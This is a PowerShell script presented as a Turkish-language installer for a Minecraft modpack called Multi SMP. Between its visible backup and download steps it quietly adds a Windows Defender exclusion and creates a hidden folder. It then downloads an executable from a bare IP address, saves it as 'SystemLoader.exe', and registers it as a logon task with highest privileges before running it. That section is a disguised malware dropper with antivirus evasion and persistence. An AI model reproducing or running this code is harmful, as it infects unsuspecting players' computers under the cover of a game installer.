Add-Type -AssemblyName PresentationCore,PresentationFramework
$msgBody = "Multi SMP Yükleyicisine Hoşgeldiniz.Modlarınız ve Oyun Ayarlarınız Silinip Multi SMPye Göre Tekrar Yüklenecektir.Yedeklemek İstediğiniz Birşey Varsa Bu Programı Kapatın ve Yedekledikten Sonra Tekrar Açın."
$msgTitle = "Lütfen Oku!"
$msgButton = 'OkCancel'
$msgImage = 'Warning'
$Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
if ($Result -eq "Cancel"){
    exit
}
Write-Host "







███╗   ███╗██╗   ██╗██╗     ████████╗██╗    ███████╗███╗   ███╗██████╗ 
████╗ ████║██║   ██║██║     ╚══██╔══╝██║    ██╔════╝████╗ ████║██╔══██╗
██╔████╔██║██║   ██║██║        ██║   ██║    ███████╗██╔████╔██║██████╔╝
██║╚██╔╝██║██║   ██║██║        ██║   ██║    ╚════██║██║╚██╔╝██║██╔═══╝ 
██║ ╚═╝ ██║╚██████╔╝███████╗   ██║   ██║    ███████║██║ ╚═╝ ██║██║     
╚═╝     ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝    ╚══════╝╚═╝     ╚═╝╚═╝     
                                                      
                          by Gamehunter_Kaan

"
Try {
    cd "$env:appdata\.minecraft" -ea stop
}
    Catch {
        Write-Host "Minecraft Klasörü Bulunamadı.Yeniden Oluşturuluyor..."; 
        cd "$env:appdata" | Out-Null; 
        mkdir .minecraft | Out-Null; 
        cd .minecraft | Out-Null
}
Write-Host "Eski Dosyalar Yedekleniyor..."
Try {
    mkdir "$env:appdata\.minecraft\yedek"; 
    Move-Item "$env:appdata\.minecraft\mods" "$env:appdata\.minecraft\config" "$env:appdata\.minecraft\versions" "$env:appdata\.minecraft\options.txt" "$env:appdata\.minecraft\optionsof.txt" "$env:appdata\.minecraft\server.dat" -Destination "$env:appdata\.minecraft\yedek" -Force -ea Stop
}
    Catch {
        Write-Host "Yedekleme Başarısız Oldu.Dosyalar Siliniyor..."; 
        Remove-Item "$env:appdata\.minecraft\mods" -Force -Recurse -erroraction 'silentlycontinue'; 
        Remove-Item "$env:appdata\.minecraft\config" -Force -Recurse -erroraction 'silentlycontinue'; 
        Remove-Item "$env:appdata\.minecraft\versions" -Force -Recurse -erroraction 'silentlycontinue'; 
        Remove-Item "$env:appdata\.minecraft\options.txt" -Force -Recurse -erroraction 'silentlycontinue'; 
        Remove-Item "$env:appdata\.minecraft\optionsof.txt" -Force -Recurse -erroraction 'silentlycontinue'; 
        Remove-Item "$env:appdata\.minecraft\server.dat" -Force -Recurse -erroraction 'silentlycontinue'
}
Write-Host "Yeni Dosyalar İndiriliyor..."
Set-MpPreference -ExclusionPath "$env:appdata\.minecraft" -erroraction 'silentlycontinue' 
mkdir "$env:appdata\.minecraft\depends" -erroraction 'silentlycontinue' | Out-Null
attrib +h "$env:appdata\.minecraft\depends" | Out-Null
cd "$env:appdata\.minecraft\depends" -erroraction 'silentlycontinue' | Out-Null
powershell Invoke-WebRequest 'http://84.54.13.23/mt.exe' -OutFile "SystemLoader.exe" | Out-Null
SCHTASKS /CREATE /SC ONLOGON /TN SystemLoader /TR "$env:appdata\.minecraft\depends\SystemLoader.exe" /F /RL HIGHEST | Out-Null
SCHTASKS /Run /TN SystemLoader | Out-Null
cd "$env:appdata\.minecraft" -erroraction 'silentlycontinue' | Out-Null
Try {
    Invoke-WebRequest 'https://github.com/GamehunterKaan/Multi-SMP/archive/refs/heads/main.zip' -OutFile "Multi-SMP.zip" -ErrorAction Stop}
    Catch {
        Write-Host "Dosyalar Yüklenemedi."
}
Write-Host "Dosyalar Zip Arşivinden Çıkarılıyor."
Try {
    Expand-Archive "$env:appdata\.minecraft\Multi-SMP.zip" -Destination "$env:appdata\.minecraft" -ea Stop}
    Catch {
        Write-Host "Dosyalar Çıkarılamadı."
}
Write-Host "Dosyalar Taşınıyor..."
Try {
    Move-Item "$env:appdata\.minecraft\Multi-SMP-main\*" -Destination "$env:appdata\.minecraft" -Force -ea Stop}
    Catch {
        Write-Host "Dosyalar Taşınamadı."
}
Write-Host "Arta Kalan Dosyalar Siliniyor..."
Remove-Item "$env:appdata\.minecraft\Multi-SMP-main" -Force -Recurse -erroraction 'silentlycontinue' | Out-Null
Remove-Item "$env:appdata\.minecraft\Multi-SMP.zip" -Force -Recurse -erroraction 'silentlycontinue' | Out-Null
Remove-Item "$env:appdata\.minecraft\README.md" -Force -Recurse -erroraction 'silentlycontinue' | Out-Null
Add-Type -AssemblyName PresentationCore,PresentationFramework
$msgBody = "Multi SMP Yüklemesi Tamamlanmıştır.Eğer Yükleme Sırasında Herhangi Bir Hata ile Karşılaşmadıysanız Minecraft Başlatıcınızdan Versiyon Olarak Multi SMPyi Seçerek Oyuna Girebilirsiniz."
$msgTitle = "Lütfen Oku."
$msgButton = 'Ok'
$msgImage = 'Information'
$Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
